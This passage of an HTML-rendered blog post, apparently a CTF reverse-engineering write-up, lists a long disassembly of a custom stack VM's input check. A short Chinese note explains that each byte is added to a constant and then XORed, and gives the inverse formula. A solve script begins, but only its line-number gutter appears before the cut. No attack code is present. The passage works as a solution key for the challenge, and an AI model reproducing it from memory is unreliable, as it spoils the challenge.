class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br></pre></td><td class="code"><pre><span class="line">push 48</span><br><span class="line">store 0</span><br><span class="line">pop</span><br><span class="line">push 176</span><br><span class="line">push 11</span><br><span class="line">load 0</span><br><span class="line">push 48</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 59</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 139</span><br><span class="line">store 0</span><br><span class="line">pop</span><br><span class="line"></span><br><span class="line">push 49</span><br><span class="line">store 1</span><br><span class="line">pop</span><br><span class="line">push 198</span><br><span class="line">push 18</span><br><span class="line">load 1</span><br><span class="line">push 49</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 67</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 133</span><br><span class="line">store 1</span><br><span class="line">pop</span><br><span class="line"></span><br><span class="line">push 50</span><br><span class="line">store 2</span><br><span class="line">pop</span><br><span class="line">push 66</span><br><span class="line">push 5</span><br><span class="line">load 2</span><br><span class="line">push 50</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 55</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 117</span><br><span class="line">store 2</span><br><span class="line">pop</span><br><span class="line">push 51</span><br><span class="line">store 3</span><br><span class="line">pop</span><br><span class="line">push 199</span><br><span class="line">push 18</span><br><span class="line">load 3</span><br><span class="line">push 51</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 69</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 130</span><br><span class="line">store 3</span><br><span class="line">pop</span><br><span class="line">push 52</span><br><span class="line">store 4</span><br><span class="line">pop</span><br><span class="line">push 170</span><br><span class="line">push 14</span><br><span class="line">load 4</span><br><span class="line">push 52</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 66</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 232</span><br><span class="line">store 4</span><br><span class="line">pop</span><br><span class="line">push 53</span><br><span class="line">store 5</span><br><span class="line">pop</span><br><span class="line">push 32</span><br><span class="line">push 13</span><br><span class="line">load 5</span><br><span class="line">push 53</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 66</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 98</span><br><span class="line">store 5</span><br><span class="line">pop</span><br><span class="line">push 54</span><br><span class="line">store 6</span><br><span class="line">pop</span><br><span class="line">push 31</span><br><span class="line">push 14</span><br><span class="line">load 6</span><br><span class="line">push 54</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 68</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 91</span><br><span class="line">store 6</span><br><span class="line">pop</span><br><span class="line">push 55</span><br><span class="line">store 7</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">push 18</span><br><span class="line">load 7</span><br><span class="line">push 55</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 73</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 117</span><br><span class="line">store 7</span><br><span class="line">pop</span><br><span class="line">push 56</span><br><span class="line">store 8</span><br><span class="line">pop</span><br><span class="line">push 26</span><br><span class="line">push 13</span><br><span class="line">load 8</span><br><span class="line">push 56</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 69</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 95</span><br><span class="line">store 8</span><br><span class="line">pop</span><br><span class="line">push 57</span><br><span class="line">store 9</span><br><span class="line">pop</span><br><span class="line">push 89</span><br><span class="line">push 18</span><br><span class="line">load 9</span><br><span class="line">push 57</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 75</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 18</span><br><span class="line">store 9</span><br><span class="line">pop</span><br><span class="line">push 48</span><br><span class="line">store 10</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">push 17</span><br><span class="line">load 10</span><br><span class="line">push 48</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 65</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 125</span><br><span class="line">store 10</span><br><span class="line">pop</span><br><span class="line">push 49</span><br><span class="line">store 11</span><br><span class="line">pop</span><br><span class="line">push 119</span><br><span class="line">push 19</span><br><span class="line">load 11</span><br><span class="line">push 49</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 68</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 51</span><br><span class="line">store 11</span><br><span class="line">pop</span><br><span class="line">push 50</span><br><span class="line">store 12</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">push 17</span><br><span class="line">load 12</span><br><span class="line">push 50</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 67</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 127</span><br><span class="line">store 12</span><br><span class="line">pop</span><br><span class="line">push 51</span><br><span class="line">store 13</span><br><span class="line">pop</span><br><span class="line">push 90</span><br><span class="line">push 5</span><br><span class="line">load 13</span><br><span class="line">push 51</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 56</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 98</span><br><span class="line">store 13</span><br><span class="line">pop</span><br><span class="line">push 52</span><br><span class="line">store 14</span><br><span class="line">pop</span><br><span class="line">push 104</span><br><span class="line">push 13</span><br><span class="line">load 14</span><br><span class="line">push 52</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 65</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 41</span><br><span class="line">store 14</span><br><span class="line">pop</span><br><span class="line">push 53</span><br><span class="line">store 15</span><br><span class="line">pop</span><br><span class="line">push 174</span><br><span class="line">push 19</span><br><span class="line">load 15</span><br><span class="line">push 53</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 72</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 230</span><br><span class="line">store 15</span><br><span class="line">pop</span><br><span class="line">push 54</span><br><span class="line">store 16</span><br><span class="line">pop</span><br><span class="line">push 146</span><br><span class="line">push 11</span><br><span class="line">load 16</span><br><span class="line">push 54</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 65</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 211</span><br><span class="line">store 16</span><br><span class="line">pop</span><br><span class="line">push 55</span><br><span class="line">store 17</span><br><span class="line">pop</span><br><span class="line">push 179</span><br><span class="line">push 5</span><br><span class="line">load 17</span><br><span class="line">push 55</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 143</span><br><span class="line">store 17</span><br><span class="line">pop</span><br><span class="line">push 56</span><br><span class="line">store 18</span><br><span class="line">pop</span><br><span class="line">push 67</span><br><span class="line">push 15</span><br><span class="line">load 18</span><br><span class="line">push 56</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 71</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 4</span><br><span class="line">store 18</span><br><span class="line">pop</span><br><span class="line">push 57</span><br><span class="line">store 19</span><br><span class="line">pop</span><br><span class="line">push 73</span><br><span class="line">push 11</span><br><span class="line">load 19</span><br><span class="line">push 57</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 68</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 13</span><br><span class="line">store 19</span><br><span class="line">pop</span><br><span class="line">push 48</span><br><span class="line">store 20</span><br><span class="line">pop</span><br><span class="line">push 50</span><br><span class="line">push 12</span><br><span class="line">load 20</span><br><span class="line">push 48</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 14</span><br><span class="line">store 20</span><br><span class="line">pop</span><br><span class="line">push 49</span><br><span class="line">store 21</span><br><span class="line">pop</span><br><span class="line">push 92</span><br><span class="line">push 19</span><br><span class="line">load 21</span><br><span class="line">push 49</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 68</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 24</span><br><span class="line">store 21</span><br><span class="line">pop</span><br><span class="line">push 50</span><br><span class="line">store 22</span><br><span class="line">pop</span><br><span class="line">push 170</span><br><span class="line">push 19</span><br><span class="line">load 22</span><br><span class="line">push 50</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 69</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 239</span><br><span class="line">store 22</span><br><span class="line">pop</span><br><span class="line">push 51</span><br><span class="line">store 23</span><br><span class="line">pop</span><br><span class="line">push 160</span><br><span class="line">push 9</span><br><span class="line">load 23</span><br><span class="line">push 51</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 156</span><br><span class="line">store 23</span><br><span class="line">pop</span><br><span class="line">push 52</span><br><span class="line">store 24</span><br><span class="line">pop</span><br><span class="line">push 166</span><br><span class="line">push 15</span><br><span class="line">load 24</span><br><span class="line">push 52</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 67</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 229</span><br><span class="line">store 24</span><br><span class="line">pop</span><br><span class="line">push 53</span><br><span class="line">store 25</span><br><span class="line">pop</span><br><span class="line">push 47</span><br><span class="line">push 8</span><br><span class="line">load 25</span><br><span class="line">push 53</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 61</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 18</span><br><span class="line">store 25</span><br><span class="line">pop</span><br><span class="line">push 54</span><br><span class="line">store 26</span><br><span class="line">pop</span><br><span class="line">push 155</span><br><span class="line">push 19</span><br><span class="line">load 26</span><br><span class="line">push 54</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 73</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 210</span><br><span class="line">store 26</span><br><span class="line">pop</span><br><span class="line">push 55</span><br><span class="line">store 27</span><br><span class="line">pop</span><br><span class="line">push 115</span><br><span class="line">push 9</span><br><span class="line">load 27</span><br><span class="line">push 55</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 64</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 51</span><br><span class="line">store 27</span><br><span class="line">pop</span><br><span class="line">push 56</span><br><span class="line">store 28</span><br><span class="line">pop</span><br><span class="line">push 60</span><br><span class="line">push 13</span><br><span class="line">load 28</span><br><span class="line">push 56</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 69</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 121</span><br><span class="line">store 28</span><br><span class="line">pop</span><br><span class="line">push 57</span><br><span class="line">store 29</span><br><span class="line">pop</span><br><span class="line">push 52</span><br><span class="line">push 12</span><br><span class="line">load 29</span><br><span class="line">push 57</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 69</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 113</span><br><span class="line">store 29</span><br><span class="line">pop</span><br><span class="line">push 49</span><br><span class="line">store 30</span><br><span class="line">pop</span><br><span class="line">push 42</span><br><span class="line">push 5</span><br><span class="line">load 30</span><br><span class="line">push 49</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 54</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 28</span><br><span class="line">store 30</span><br><span class="line">pop</span><br><span class="line">push 50</span><br><span class="line">store 31</span><br><span class="line">pop</span><br><span class="line">push 96</span><br><span class="line">push 19</span><br><span class="line">load 31</span><br><span class="line">push 50</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 69</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 37</span><br><span class="line">store 31</span><br><span class="line">pop</span><br><span class="line">push 51</span><br><span class="line">store 32</span><br><span class="line">pop</span><br><span class="line">push 72</span><br><span class="line">push 7</span><br><span class="line">load 32</span><br><span class="line">push 51</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 58</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 114</span><br><span class="line">store 32</span><br><span class="line">pop</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">push 48</span><br><span class="line">store 0</span><br><span class="line">pop</span><br><span class="line">push 176</span><br><span class="line">push 11</span><br><span class="line">load 0</span><br><span class="line">push 48</span><br><span class="line">add</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 59</span><br><span class="line">xor</span><br><span class="line">pop</span><br><span class="line">pop</span><br><span class="line">push 139</span><br><span class="line">store 0</span><br><span class="line">pop</span><br></pre></td></tr></table></figure><p>观察其实就是做了个add 然后 xor</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 + 11 = 59</span><br><span class="line">59 ^ 176 = 139</span><br><span class="line">enc = (input + r1) ^ r2</span><br><span class="line">input = (r2 ^ enc) - r1</span><br></pre></td></tr></table></figure><p>我把两种都放在了下面其实一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span 